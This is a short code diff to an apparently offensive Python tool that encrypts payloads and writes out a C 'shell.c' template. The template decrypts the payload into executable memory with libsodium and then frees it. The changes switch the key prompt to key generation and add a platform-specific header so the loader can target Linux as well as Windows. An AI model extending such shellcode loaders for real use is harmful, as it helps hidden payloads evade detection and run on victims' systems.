@@ -131,7 +131,7 @@ def decrypt_file(file_path: str = "", key: bytes = None) -> None:
 
 def encrypt_phrase(phrase: str = "", key: bytes = None) -> bytes:
     """Encrypt a phrase and optionally save the result."""
-    key = key or ask_key(ask_load_key=True)
+    key = key or ask_key(ask_generate_key=True)
     phrase = phrase or input("Phrase: ")
     encrypted_data = encrypt_data(phrase.encode("utf-8"), key)
 
@@ -217,14 +217,17 @@ def create_c_template(encrypted_data_array: str, key_array: str, platform: str =
         "windows": "VirtualFree(exec_mem, 0, MEM_RELEASE);",
         "linux": "munmap(exec_mem, sizeof(decrypted));"
     }
-
+    includes = {
+        "windows": "windows.h",
+        "linux": "sys/mman.h"
+    }
     return f"""
 // x86_64-w64-mingw32-gcc shell.c -o shell.exe -lsodium -static
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
 #include <sodium.h>
-#include <windows.h>
+#include <{includes[platform]}>
 
 int main() {{
     if (sodium_init() < 0) {{
